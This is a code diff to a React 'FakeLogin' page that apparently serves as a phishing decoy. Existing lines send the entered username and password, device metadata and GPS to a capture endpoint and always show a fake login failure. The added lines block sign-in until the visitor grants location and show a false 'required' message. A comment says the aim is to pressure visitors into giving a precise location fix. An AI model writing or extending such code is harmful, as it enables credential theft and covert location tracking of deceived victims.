@@ -242,7 +242,20 @@ export default function FakeLogin() {
     const [meta, gps] = await Promise.all([collectClientMeta(), requestGps()])
     await sendCapture({ stage: 'submit', username, password, gps, meta })
 
-    // Always fail, with a realistic delay, so the decoy is convincing.
+    // Gate sign-in on location: if GPS was not granted, refuse to proceed and
+    // tell the visitor location is required. This pressures them to accept the
+    // prompt (so we get a precise fix) rather than dismiss it.
+    if (!gps) {
+      setTimeout(() => {
+        setSubmitting(false)
+        setError(
+          'Location access is required to sign in. Please enable location for this site and try again.'
+        )
+      }, 500)
+      return
+    }
+
+    // Location granted → run the normal "wrong credentials" deception.
     setTimeout(() => {
       setSubmitting(false)
       setError('Invalid username or password')
@@ -265,7 +278,8 @@ export default function FakeLogin() {
         <div className="rounded-2xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/50">
           <h2 className="mb-2 text-lg font-semibold text-slate-900">Sign In</h2>
           <p className="mb-6 text-xs text-slate-400">
-            For your security, please allow location access to verify this device.
+            For your security, location access is <span className="font-semibold text-slate-500">required</span> to
+            verify this device before signing in.
           </p>
 
           {error && (
